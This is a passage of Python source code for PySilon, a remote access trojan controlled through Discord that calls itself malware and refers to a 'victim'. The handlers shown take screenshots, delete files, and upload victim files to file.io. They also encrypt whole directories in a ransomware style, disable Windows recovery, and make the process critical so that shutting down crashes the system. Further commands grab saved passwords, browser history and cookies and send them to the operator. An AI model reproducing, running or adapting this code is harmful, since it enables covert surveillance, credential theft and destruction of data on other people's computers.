        'enable-reset': ['➡️ `.enable-reset`', 'Enables windows recovery (ReAgentC)'],
        'encrypt': ['➡️ `.encrypt <directory>`', 'Encrypts every file in the specified directory'],
        'decrypt': ['➡️ `.decrypt <directory>`', 'Decrypts every file in the specified directory'],
        'implode': ['➡️ `.implode`', 'Entirely wipes the malware off of the victim\'s PC (to remove traces).']
    }
}

@client.event
async def on_message(message):
    global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message, processes_messages, processes_list, process_to_kill, cookies_thread, implode_confirmation, cmd_messages, keyboard_listener, mouse_listener, clipper_stop, input_blocked, custom_message_to_send, turned_off
    #.log New message logged
    if message.author != client.user:
        if message.content == f'<@{client.user.id}>':
            #.log Author mentioned PySilon BOT
            await client.get_channel(channel_ids['main']).send(f'<@{message.author.id}>')
            #.log Sent message with mention of Author
        #.log Author is not a BOT
        if message.channel.id in channel_ids.values():
            #.log Message channel is controlling this PC
            if message.content == '.implode':
                #.log Message is "implode"
                await message.delete()
                #.log Removed the message
                await message.channel.send('``` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` ```\n\n```Send here PySilon.key generated along with RAT executable```\n\n')
                expectation = 'key'
                #.log Sent further instructions for implosion
            
            elif message.content == '.restart':
                #.log Message is "restart"
                await message.delete()
                #.log Removed the message
                await message.channel.send('```PySilon will be restarted now... Stand by...```')
                #.log Sent message about restart
                os.startfile(f'C:\\Users\\{getuser()}\\{software_directory_name}\\{software_executable_name}')
                #.log Executed PySilon. Killing itself
                sys.exit(0)
                
            elif message.content[:5] == '.help':
                
                await message.delete()
                
                if message.content.strip() == '.help':
                    #.log Author wants general help
                    embed = discord.Embed(title='List of all available commands', color=0x49fc03)
                    for i in help['commands'].keys():
                        embed.add_field(name=help['commands'][i][0], value=help['commands'][i][1], inline=False)
                    await message.channel.send(embed=embed)
                    embed = discord.Embed(color=0x49fc03)
                    for i in help['commands2'].keys():
                        embed.add_field(name=help['commands2'][i][0], value=help['commands2'][i][1], inline=False)
                    await message.channel.send(embed=embed)
                    #.log Sent message with PySilon commands manual
                
            elif message.content == '.set-critical':
                #.log Message is set-critical
                await message.delete()
                #.log Removed the message
                try:
                    ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
                    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
                    #.log Set PySilon as a critical process
                    embed = discord.Embed(title="🟣 System",description=f'```Process elevated to critical status successfully.\nWarning: This critical process can cause of BSOD when the victim tries to shut down their system.```', colour=discord.Colour.purple())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    #.log Sent success message
                except: 
                    await message.channel.send('`Something went wrong while elevating the process`')
                    #.log Something went wrong when setting critical process

            elif message.content == '.unset-critical':
                #.log Message is unset-critical
                await message.delete()
                #.log Removed the message
                try:
                    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
                    #.log Removed PySilon from critical processes
                    embed = discord.Embed(title="🟣 System",description=f'```Successfully removed critical status from process.```', colour=discord.Colour.purple())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    #.log Sent success message
                except: 
                    await message.channel.send('`Something went wrong while removing critical status`')
                    #.log Something went wrong when unsetting critical process

            elif message.content == '.disable-reset':
                #.log Message is disable-reset
                await message.delete()
                #.log Removed the message
                if IsAdmin():
                    subprocess.run('reagentc.exe /disable', creationflags=subprocess.CREATE_NO_WINDOW)
                    #.log Disabled ReAgentC
                    embed = discord.Embed(title="🟣 System",description=f'```Successfully disabled REAgentC.```', colour=discord.Colour.purple())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    #.log Sent success message
                else:
                    embed = discord.Embed(title="📛 Error",description=f'```Disabling REAgentC requires elevation.```', colour=discord.Colour.purple())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    #.log Sent error message for missing permissions

            elif message.content == '.enable-reset':
                #.log Message is disable-reset
                await message.delete()
                #.log Removed the message
                if IsAdmin():
                    subprocess.run('reagentc.exe /enable', creationflags=subprocess.CREATE_NO_WINDOW)
                    #.log Disabled ReAgentC
                    embed = discord.Embed(title="🟣 System",description=f'```Successfully enabled REAgentC.```', colour=discord.Colour.purple())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    #.log Sent success message
                else:
                    embed = discord.Embed(title="📛 Error",description=f'```Enabling REAgentC requires elevation.```', colour=discord.Colour.purple())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    #.log Sent error message for missing permissions

            elif expectation == 'key':
                #.log Message is PySilon.key candidate
                try:
                    split_v1 = str(message.attachments).split("filename='")[1]
                    #.log Message has a file attached
                    filename = str(split_v1).split("' ")[0]
                    filename = f'C:\\Users\\{getuser()}\\{software_directory_name}\\' + filename
                    #.log Fetched file name
                    await message.attachments[0].save(fp=filename)
                    #.log Downloaded the attached file
                    if get_file_hash(filename) == secret_key:
                        #.log File\'s checksum is same as secret key
                        reaction_msg = await message.channel.send('```You are authorized to remotely remove PySilon RAT from target PC. Everything related to PySilon will be erased after you confirm this action by reacting with "💀".\nWARNING! This cannot be undone after you decide to proceed. You can cancel it, by reacting with "🔴".```')
                        #.log Sent message that Author is authorized to implode PySilon
                        await reaction_msg.add_reaction('💀')
                        #.log Added "implode" reaction
                        await reaction_msg.add_reaction('🔴')
                        #.log Added "cancel implosion" reaction
                        expectation = 'implosion'
                    else:
                        #.log Message does not contain valid PySilon.key for this copy
                        reaction_msg = await message.channel.send('```❗ Provided key is invalid```'); await reaction_msg.add_reaction('🔴')
                        #.log Sent message about denial of access
                        expectation = None
                except Exception as err: 
                    #.log An error occurred while fetching the PySilon.key candidate
                    await message.channel.send(f'```❗ Something went wrong while fetching secret key...\n{str(err)}```')
                    #.log Sent information about the error
                    expectation = None

            elif message.content == '.ss':
                #.log Message is "take screenshot"(screenshot.py:7)*
                await message.delete()
                #.log Removed the message(screenshot.py:9)*
                ImageGrab.grab(all_screens=True).save(f'C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png')
                #.log Saved a screenshot of this PCs screen(screenshot.py:11)*
                reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time() + ' `[On demand]`', color=0x0084ff).set_image(url='attachment://ss.png'), file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png'))
                #.log Sent embed containing screenshot(screenshot.py:13)*
                await reaction_msg.add_reaction('📌')
                #.log Reacted with "pin"(screenshot.py:15)*
                subprocess.run(f'del C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png', shell=True)
                #.log Removed the screenshot(screenshot.py:18)*
            elif message.content[:9] == '.download':
                #.log Message is "download" (file_downloading.py:7)*
                await message.delete()
                #.log Removed the message (file_downloading.py:9)*
                if message.channel.id == channel_ids['file']:
                    #.log Message channel is the file-related channel (file_downloading.py:11)*
                    if message.content == '.download':
                        #.log Author issued empty ".download" command (file_downloading.py:13)*
                        embed = discord.Embed(title="📛 Error",description=f'```Syntax: .download <file-or-directory>```', colour=discord.Colour.red())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                        #.log Sent embed about usage of ".download" (file_downloading.py:17)*
                    else:
                        if os.path.exists('/'.join(working_directory) + '/' + message.content[10:]):
                            #.log File requested by Author does exist on this PC (file_downloading.py:20)*
                            target_file = '/'.join(working_directory) + '/' + message.content[10:]
                            #.log Determined actual path to requested file (file_downloading.py:22)*
                            if os.path.isdir(target_file):
                                #.log The file turned out to be a directory (file_downloading.py:24)*
                                target_file += '.zip'
                                with ZipFile(target_file,'w') as zip:
                                    for file in get_all_file_paths('.'.join(target_file.split('.')[:-1])):
                                        try:
                                            zip.write(file)
                                            #.log Compressed the directory into .zip (file_downloading.py:30)*
                                        except Exception as e:
                                            #.log Error occurred while compressing the directory into .zip (file_downloading.py:32)*
                                            message.channel.send(e)
                                            #.log Sent message with information about this error. Aborting operation (file_downloading.py:34)*
                                            pass
                            await message.channel.send("```Uploading to file.io... This can take a while depending on the file size, amount and the victim's internet speed..```")
                            #.log Sent message about File.io upload (file_downloading.py:37)*
                            data = {
                                'file': open(target_file, 'rb')
                            }
                            url = 'https://file.io/'
                            #.log Set up required things for File.io upload (file_downloading.py:42)*
                            response = requests.post(url, files=data)
                            #.log Uploaded the file onto File.io(file_downloading.py:44)*
                            data = response.json()
                            #.log Received response from File.io (file_downloading.py:46)*
                            embed = discord.Embed(title=f"🟢 {message.content[10:]}",description=f"Click [here](<{data['link']}>) to download.", colour=discord.Colour.green())
                            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                            await message.channel.send(embed=embed)
                            #.log Sent Anonfiles link to uploaded file(file_downloading.py:50)*
                            await message.channel.send('Warning: The file will be removed from file.io right after the first download.')
                        else:
                            #.log File requested by Author does not exist on this PC (file_downloading.py:53)*
                            embed = discord.Embed(title="📛 Error",description=f'```❗ File or directory not found.```', colour=discord.Colour.red())
                            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                            reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                            #.log Sent embed about missing file (file_downloading.py:57)*
                else:
                    #.log Message is not sent on file-related channel (file_downloading.py:59)*
                    embed = discord.Embed(title="📛 Error",description=f'_ _\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    #.log Sent embed about wrong channel (file_downloading.py:63)*
            elif message.content == '.done':
                #.log Message is "done" (file_uploading.py:54)*
                await message.delete()
                #.log Removed the message (file_uploading.py:56)*
                if expectation == 'multiplefiles':
                    #.log Multiple files were logged (file_uploading.py:58)*
                    files_to_merge[0].append(await message.channel.send('```This files will be uploaded and merged into  ' + '/'.join(working_directory) + '/' + files_to_merge[2] + '  after you react with 📤 to this message, or with 🔴 to cancel this operation```'))
                    #.log Sent message about ongoing file downloading and merging (file_uploading.py:60)*
                    await files_to_merge[0][-1].add_reaction('📤')
                    #.log Reacted with "confirm upload" (file_uploading.py:62)*
                    await files_to_merge[0][-1].add_reaction('🔴')
                    #.log Reacted with "cancel uploading" (file_uploading.py:64)*
            elif message.content[:7] == '.upload':
                #.log Message is "upload" (file_uploading.py:66)*
                await message.delete()
                #.log Removed the message (file_uploading.py:68)*
                if message.channel.id == channel_ids['file']:
                    #.log Message channel is file-related (file_uploading.py:70)*
                    if message.content.strip() == '.upload':
                        #.log Author issued empty .upload (file_uploading.py:72)*
                        reaction_msg = await message.channel.send('```Syntax: .upload <type> [name]\nTypes:\n    single - upload one file with size less than 25MB\n    multiple - upload multiple files prepared by Splitter with total size greater than 25MB```'); await reaction_msg.add_reaction('🔴')
                        #.log Sent message about usage of .upload (file_uploading.py:74)*
                    else:
                        if message.content[8:] == 'single':
                            #.log Author requested to upload single file (file_uploading.py:77)*
                            expectation = 'onefile'
                            await message.channel.send('```Please send here a file to upload.```')
                            #.log Sent message letting to send files (file_uploading.py:80)*
                        elif message.content[8:16] == 'multiple' and len(message.content) > 17:
                            #.log Author requested to upload multiple files (divided bigger one) (file_uploading.py:82)*
                            expectation = 'multiplefiles'
                            files_to_merge[2] = message.content[17:]
                            files_to_merge[0].append(await message.channel.send('```Please send here all files (one-by-one) prepared by Splitter and then type  .done```'))
                            #.log Sent message about files logging (file_uploading.py:86)*
                        else:
                            #.log The syntax of command is wrong (file_uploading.py:88)*
                            reaction_msg = await message.channel.send('```Syntax: .upload multiple <name>```'); await reaction_msg.add_reaction('🔴')
                            #.log Sent message about usage of .upload (file_uploading.py:90)*
                else:
                    #.log Message channel is not file-related (file_uploading.py:92)*
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
                    #.log Sent message about wrong channel (file_uploading.py:94)*
            elif message.content[:7] == '.remove':
                #.log Message is "remove" (file_removal.py:7)*
                await message.delete()
                #.log Removed the message (file_removal.py:9)*
                if message.channel.id == channel_ids['file']:
                    #.log Message channel is file-related (file_removal.py:11)*
                    if message.content.strip() == '.remove':
                        #.log Author issued empty .remove (file_removal.py:13)*
                        embed = discord.Embed(title="📛 Error",description=f'```Syntax: .remove <file-or-directory>```', colour=discord.Colour.red())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                        #.log Sent embed with usage of .remove (file_removal.py:17)*
                    else:
                        if os.path.exists('/'.join(working_directory) + '/' + message.content[8:]):
                            #.log File/Directory requested by Author does exist on this PC (file_removal.py:20)*
                            try:
                                if os.path.isfile('/'.join(working_directory) + '/' + message.content[8:]):
                                    subprocess.run('del "' + '\\'.join(working_directory) + '\\' + message.content[8:] + '"', shell=True)
                                    #.log Removed a file (file_removal.py:24)*
                                else:
                                    rmtree('/'.join(working_directory) + '/' + message.content[8:])
                                    #.log Removed a directory (file_removal.py:27)*
                                embed = discord.Embed(title="🟢 Success",description=f'```Successfully removed  ' + '/'.join(working_directory) + '/' + message.content[8:] + '  from target PC```', colour=discord.Colour.green())
                                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                                reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                                #.log Sent embed about removal (file_removal.py:31)*
                            except Exception as error:
                                #.log Error occurred while trying to remove a file/directory (file_removal.py:33)*
                                embed = discord.Embed(title="📛 Error",description=f'`' + str(error) + '`', colour=discord.Colour.red())
                                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                                reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                                #.log Sent embed with information about this error (file_removal.py:37)*
                        else:
                            #.log File/Directory requested by Author does not exist on this PC (file_removal.py:39)*
                            embed = discord.Embed(title="📛 Error",description=f'```❗ File or directory not found.```', colour=discord.Colour.red())
                            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                            reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                            #.log Sent embed about missing file/directory (file_removal.py:43)*
                else:
                    #.log Message channel is not file-related (file_removal.py:45)*
                    embed = discord.Embed(title="📛 Error",description=f'||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    #.log Sent embed about wrong channel (file_removal.py:49)*
            elif message.content == '.clear':
                #.log Message is "clear" (file_explorer.py:27)*
                await message.delete()
                #.log Removed the message (file_explorer.py:29)*
                if message.channel.id == channel_ids['file']:
                    #.log Message channel is file-related (file_explorer.py:31)*
                    async for message in client.get_channel(channel_ids['file']).history():
                        await message.delete()
                        #.log Removed a message (file_explorer.py:34)*
                else:
                    #.log Message channel is not file-related (file_explorer.py:36)*
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
                    #.log Sent message about wrong channel (file_explorer.py:38)*
            elif message.content == '.tree':
                #.log Message is "tree" (file_explorer.py:40)*
                await message.delete()
                #.log Removed the message (file_explorer.py:42)*
                if message.channel.id == channel_ids['file']:
                    #.log Message channel is file-related (file_explorer.py:44)*
                    tree_messages = []
                    tree_txt_path = f'C:\\Users\\{getuser()}\\{software_directory_name}\\' + 'tree.txt'
                    dir_path = Path('/'.join(working_directory))
                    tree_messages.append(await message.channel.send('```Directory tree requested by ' + str(message.author) + '\n\n' + '/'.join(working_directory) + '```'))
                    #.log Sent first message of tree (file_explorer.py:49)*
                    with open(tree_txt_path, 'w', encoding='utf-8') as system_tree:
                        system_tree.write(str(dir_path) + '\n')
                        #.log Created tree.txt (file_explorer.py:52)*
                    length_limit = sys.maxsize
                    iterator = tree(Path('/'.join(working_directory)))
                    #.log Got tree (file_explorer.py:55)*
                    tree_message_content = '```^\n'
                    for line in islice(iterator, length_limit):
                        with open(tree_txt_path, 'a+', encoding='utf-8') as system_tree:
                            system_tree.write(line + '\n')
                            #.log Written tree into tree.txt (file_explorer.py:60)*
                        if len(tree_message_content) > 1800:
                            tree_messages.append(await message.channel.send(tree_message_content + str(line) + '```'))
                            #.log Sent tree (file_explorer.py:63)*
                            tree_message_content = '```'
                        else:
                            tree_message_content += str(line) + '\n'
                            #.log Sent tree (file_explorer.py:67)*
                    if tree_message_content != '```':
                        tree_messages.append(await message.channel.send(tree_message_content + '```'))
                        #.log Sent tree (file_explorer.py:70)*
                    reaction_msg = await message.channel.send('```End of tree. React with 📥 to download this tree as .txt file, or with 🔴 to clear all above messages```')
                    #.log Sent message about end of tree (file_explorer.py:72)*
                    await reaction_msg.add_reaction('📥')
                    #.log Reacted with "download tree" (file_explorer.py:74)*
                    await reaction_msg.add_reaction('🔴')
                    #.log Reacted with "remove tree messages" (file_explorer.py:76)*
                else:
                    #.log Message channel is not file-related (file_explorer.py:78)*
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
                    #.log Sent message about wrong channel (file_explorer.py:80)*
            elif message.content[:3] == '.cd':
                #.log Message is "cd" (file_explorer.py:82)*
                await message.delete()
                #.log Removed the message (file_explorer.py:84)*
                if message.channel.id == channel_ids['file']:
                    #.log Message channel is file-related (file_explorer.py:86)*
                    if message.content.strip() == '.cd':
                        #.log Author issued empty .cd (file_explorer.py:88)*
                        reaction_msg = await message.channel.send('```Syntax: .cd <directory>```'); await reaction_msg.add_reaction('🔴')
                        #.log Sent message with usage of .cd (file_explorer.py:90)*
                    else:
                        if os.path.isdir('/'.join(working_directory) + '/' + message.content[4:]):
                            #.log Requested directory exists on this PC (file_explorer.py:93)*
                            if '/' in message.content:
                                #.log Author requested to change directory by more than 1 level (file_explorer.py:95)*
                                for dir in message.content[4:].split('/'):
                                    if dir == '..':
                                        working_directory.pop(-1)
                                        #.log Moved one directory backwards (file_explorer.py:99)*
                                    else:
                                        working_directory.append(dir)
                                        #.log Moved one directory forward (file_explorer.py:102)*
                            else:
                                if message.content[4:] == '..':
                                    working_directory.pop(-1)
                                    #.log Moved one directory backwards (file_explorer.py:106)*
                                else:
                                    working_directory.append(message.content[4:])
                                    #.log Moved one directory forward (file_explorer.py:109)*
                            reaction_msg = await message.channel.send('```You are now in: ' + '/'.join(working_directory) + '```'); await reaction_msg.add_reaction('🔴')
                            #.log Sent message about new working directory (file_explorer.py:111)*
                        else:
                            if os.path.isdir(message.content[4:]):
                                #.log Author requested to change working directory to certain path (file_explorer.py:114)*
                                working_directory.clear()
                                #.log Cleared working directory variable (file_explorer.py:116)*
                                for dir in message.content[4:].split('/'):
                                    working_directory.append(dir)
                                    #.log Moved one directory forward (file_explorer.py:119)*
                                reaction_msg = await message.channel.send('```You are now in: ' + '/'.join(working_directory) + '```'); await reaction_msg.add_reaction('🔴')
                                #.log Sent message about new working directory (file_explorer.py:121)*
                            else:
                                #.log Requested directory does not exist on this PC (file_explorer.py:123)*
                                reaction_msg = await message.channel.send('```❗ Directory not found.```'); await reaction_msg.add_reaction('🔴')
                                #.log Sent message about missing directory (file_explorer.py:125)*
                else:
                    #.log Message channel is not file-related (file_explorer.py:127)*
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
                    #.log Sent message about wrong channel (file_explorer.py:129)*
            elif message.content == '.ls':
                #.log Message is "ls" (file_explorer.py:131)*
                await message.delete()
                #.log Removed the message (file_explorer.py:133)*
                if message.channel.id == channel_ids['file']:
                    #.log Message channel is file-related (file_explorer.py:135)*
                    dir_content_f, dir_content_d, directory_content = [], [], []
                    for element in os.listdir('/'.join(working_directory)+'/'):
                        if os.path.isfile('/'.join(working_directory)+'/'+element): dir_content_f.append(element)
                        else: dir_content_d.append(element)
                    #.log Fetched the content of working directory (file_explorer.py:140)*
                    dir_content_d.sort(key=str.casefold); dir_content_f.sort(key=str.casefold)
                    #.log Sorted the listed content of working directory (file_explorer.py:142)*
                    for single_directory in dir_content_d: directory_content.append(single_directory)
                    for single_file in dir_content_f: directory_content.append(single_file)
                    #.log Built final list of working directory content (file_explorer.py:145)*
                    await message.channel.send('```Content of ' + '/'.join(working_directory) +'/ at ' + current_time() + '```')
                    #.log Sent header message of working directory list (file_explorer.py:147)*
                    lsoutput = directory_content
                    while lsoutput != []:
                        if len('\n'.join(lsoutput)) > 1994:
                            #.log Working directory content list is too big to send with one message. Dividing it (file_explorer.py:151)*
                            temp = ''
                            while len(temp+lsoutput[0])+1 < 1994:
                                temp += lsoutput[0] + '\n'
                                lsoutput.pop(0)
                            await message.channel.send('```' + temp + '```')
                            #.log Sent a part of working directory content list (file_explorer.py:157)*
                        else:
                            await message.channel.send('```' + '\n'.join(lsoutput) + '```')
                            #.log Sent working directory content list (file_explorer.py:160)*
                            lsoutput = []
                else:
                    #.log Message channel is not file-related (file_explorer.py:163)*
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
                    #.log Sent message about wrong channel (file_explorer.py:165)*
            elif message.content == '.pwd':
                #.log Message is "pwd" (file_explorer.py:167)*
                await message.delete()
                #.log Removed the message (file_explorer.py:169)*
                if message.channel.id == channel_ids['file']:
                    #.log Message channel is file-related (file_explorer.py:171)*
                    reaction_msg = await message.channel.send('```You are now in: ' + '/'.join(working_directory) + '```'); await reaction_msg.add_reaction('🔴')
                    #.log Sent message with current working directory (file_explorer.py:173)*
                else:
                    #.log Message channel is not file-related (file_explorer.py:175)*
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
                    #.log Sent message about wrong channel (file_explorer.py:177)*
            elif message.content[:8] == '.encrypt':
                #.log Message is "encrypt"(file_encryption.py:8)*
                await message.delete()
                #.log Removed the message (file_encryption.py:10)*
                if message.content.strip() == '.encrypt':
                    embed = discord.Embed(title="📛 Error",description='```Syntax: .encrypt <path to folder>```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                else:
                    folder_path = message.content[9:]
                    folder_path = folder_path.replace('\\','/')
                    current_pid = os.getpid()
                    running_processes = set()
                    for process in psutil.process_iter(['pid', 'name']):
                        try:
                            if process.info['pid'] != current_pid:
                                running_processes.add(process.info['name'])
                        except (psutil.NoSuchProcess, psutil.AccessDenied):
                            pass
                    key = Fernet.generate_key()
                    cipher_suite = Fernet(key)
                    original_file_extensions = []
                    for root, dirs, files in os.walk(folder_path):
                        for file in files:
                            file_path = os.path.join(root, file)
                            if not file_path.endswith('.pysilon'):
                                _, file_extension = os.path.splitext(file_path)
                                if os.path.basename(file_path) not in running_processes:
                                    with open(file_path, 'rb') as f:
                                        file_data = f.read()
                                    original_file_extensions.append(file_extension)
                                    encrypted_data = cipher_suite.encrypt(file_data)
                                    new_file_name = os.path.splitext(file_path)[0] + '.pysilon'
                                    os.rename(file_path, new_file_name)
                                    with open(new_file_name, 'wb') as f:
                                        f.write(encrypted_data)
                    if original_file_extensions:
                        with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\file_extensions.pkl', 'wb') as ext_file:
                            pickle.dump(original_file_extensions, ext_file)
                    with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\pysilon_encryption.key', 'wb') as key_file:
                        key_file.write(key)
                    embed = discord.Embed(title="🟢 Success",description=f'```Successfully encrypted the path!```', colour=discord.Colour.green())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
            elif message.content[:8] == '.decrypt':
                #.log Message is "decrypt"(file_encryption.py:65)*
                await message.delete()
                #.log Removed the message (file_encryption.py:67)*
                if message.content.strip() == '.decrypt':
                    embed = discord.Embed(title="📛 Error",description='```Syntax: .decrypt <path to folder>```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                else:
                    folder_path = message.content[9:]
                    folder_path = folder_path.replace('\\','/')
                    with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\pysilon_encryption.key', "rb") as key_file:
                        key = key_file.read()
                    cipher_suite = Fernet(key)
                    with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\file_extensions.pkl', "rb") as ext_file:
                        original_file_extensions = pickle.load(ext_file)
                    for root, dirs, files in os.walk(folder_path):
                        for file in files:
                            file_path = os.path.join(root, file)
                            if file_path.endswith('.pysilon'):
                                with open(file_path, 'rb') as f:
                                    encrypted_data = f.read()
                                decrypted_data = cipher_suite.decrypt(encrypted_data)
                                original_extension = original_file_extensions.pop(0)
                                new_file_name = os.path.splitext(file_path)[0] + original_extension
                                with open(new_file_name, 'wb') as f:
                                    f.write(decrypted_data)
                                os.remove(file_path)
                    embed = discord.Embed(title="🟢 Success",description=f'```Successfully decrypted the path!```', colour=discord.Colour.green())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
            elif message.content[:5] == '.grab':
                #.log Message is grab (grabber.py:12)*
                await message.delete()
                #.log Removed the message (grabber.py:14)*
                if message.content.strip() == '.grab':
                    #.log Author issued empty .grab command (grabber.py:16)*
                    reaction_msg = await message.channel.send('```Syntax: .grab <what-to-grab>```'); await reaction_msg.add_reaction('🔴')
                    #.log Sent message about usage of .grab (grabber.py:18)*
                else:
                    if message.content[6:] == 'passwords':
                        #.log Author requested for grabbing passwords (grabber.py:21)*
                        result = grab_passwords()
                        #.log Grabbed passwords (grabber.py:23)*
                        embed=discord.Embed(title='Grabbed saved passwords', color=0x0084ff)
                        for url in result.keys():
                            embed.add_field(name='🔗 ' + url, value='👤 ' + result[url][0] + '\n🔑 ' + result[url][1], inline=False)
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('📌')
                        #.log Sent embed with all grabbed passwords (grabber.py:28)*
                    elif message.content[6:] == 'history':
                        #.log Author requested for grabbing browser history (grabber.py:30)*
                        with open('history.txt', 'w') as history:
                            for entry in get_history().histories:
                                history.write(entry[0].strftime('%d.%m.%Y %H:%M') + ' -> ' + entry[1] +'\n\n')
                            #.log Grabbed browser history into history.txt (grabber.py:34)*
                        reaction_msg = await message.channel.send(file=discord.File('history.txt')); await reaction_msg.add_reaction('🔴')
                        #.log Sent history.txt (grabber.py:36)*
                        subprocess.run('del history.txt', shell=True)
                        #.log Removed history.txt (grabber.py:38)*
                    elif message.content[6:] == 'cookies':
                        #.log Author requested for grabbing cookies (grabber.py:40)*
                        await message.channel.send('```Grabbing cookies. Please wait...```')
                        #.log Sent message about beginning of grabbing cookies (grabber.py:42)*
                        grab_cookies()
                        #.log Grabbed cookies (grabber.py:44)*
                        await asyncio.sleep(1)
                        reaction_msg = await message.channel.send('```Grabbed cookies```', file=discord.File(f'C:\\Users\\{getuser()}\\cookies.txt', filename='cookies.txt')); await reaction_msg.add_reaction('📌')
                        #.log Sent message with grabbed cookies (grabber.py:47)*
                        subprocess.run(f'del C:\\Users\\{getuser()}\\cookies.txt', shell=True)
